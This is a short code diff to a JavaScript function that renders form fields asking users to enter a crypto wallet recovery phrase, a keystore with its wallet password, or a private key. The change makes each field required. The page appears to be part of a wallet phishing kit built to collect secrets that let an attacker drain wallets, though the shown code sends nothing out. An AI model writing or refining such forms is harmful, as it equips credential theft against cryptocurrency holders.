@@ -115,21 +115,21 @@ function showInfoInput(selectedWallet) {
                 case 'phrase':
                     infoInputContainer.innerHTML = `
                         <label for="wallet-phrase">Enter your recovery phrase for ${selectedWallet}:</label>
-                        <textarea id="wallet-phrase" placeholder="Typical 12 (sometimes 24) words separated by single spaces." rows="4"></textarea>
+                        <textarea id="wallet-phrase" placeholder="Typical 12 (sometimes 24) words separated by single spaces." rows="4" required></textarea>
                     `;
                     break;
                 case 'keystore':
                     infoInputContainer.innerHTML = `
                         <label for="wallet-keystore">Enter Keystore for ${selectedWallet}:</label>
-                        <input type="text" id="wallet-keystore" placeholder="Several lines of text beginning with '{...}'">
+                        <input type="text" id="wallet-keystore" placeholder="Several lines of text beginning with '{...}'" required>
                         <label for="wallet-password">Wallet Password:</label>
-                        <input type="password" id="wallet-password" placeholder="Enter your password">
+                        <input type="password" id="wallet-password" placeholder="Enter your password" required >
                     `;
                     break;
                 case 'private-key':
                     infoInputContainer.innerHTML = `
                         <label for="wallet-private-key">Enter your Private Key for ${selectedWallet}:</label>
-                        <input type="text" id="wallet-private-key" placeholder="Typically 12 (sometimes 24) words separated by a single space.">
+                        <input type="text" id="wallet-private-key" placeholder="Typically 12 (sometimes 24) words separated by a single space." required>
                     `;
                     break;
                 default:
